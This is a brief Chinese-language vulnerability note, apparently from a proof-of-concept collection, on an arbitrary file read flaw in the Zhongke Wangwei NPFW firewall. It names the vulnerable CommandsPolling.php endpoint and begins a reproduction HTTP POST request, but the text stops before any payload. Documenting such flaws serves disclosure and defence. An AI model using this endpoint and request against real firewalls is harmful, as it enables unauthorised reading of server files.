# 中科网威 NPFW防火墙 CommandsPolling.php 任意文件读取漏洞

## 漏洞描述
中科网威 NPFW防火墙 存在任意文件读取漏洞，由于代码过滤不足，可读取服务器任意文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登录页面

![img](images/202202101852340.png)

发送请求包

```php
POST /direct/polling/CommandsPolling.php HTTP/1.1
Host: 
Cookie: PHPSESSID=014d2705856e1df139772db42ccbaf9f
